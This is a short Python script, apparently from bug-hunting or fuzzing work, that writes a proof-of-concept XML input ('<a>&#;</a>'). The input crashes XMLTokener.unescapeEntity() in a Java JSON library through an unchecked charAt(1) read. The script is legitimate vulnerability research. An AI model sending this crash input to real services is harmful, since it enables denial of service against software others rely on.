#!/usr/bin/env python3
"""Generate PoC for jsonjava-unescape-strindex.

XMLTokener.unescapeEntity() checks e.charAt(0)=='#' then unconditionally
reads e.charAt(1) to test for 'x' / 'X'. Input "&#;" yields entity body
"#" of length 1, so charAt(1) throws StringIndexOutOfBoundsException.
"""

def create_poc(output='poc.bin'):
    # "&#;" -> unescapeEntity called with body "#"; charAt(1) goes OOB.
    blob = b'<a>&#;</a>'
    with open(output, 'wb') as f:
        f.write(blob)
    print(f"wrote {output} ({len(blob)} bytes)")


if __name__ == '__main__':
    create_poc()
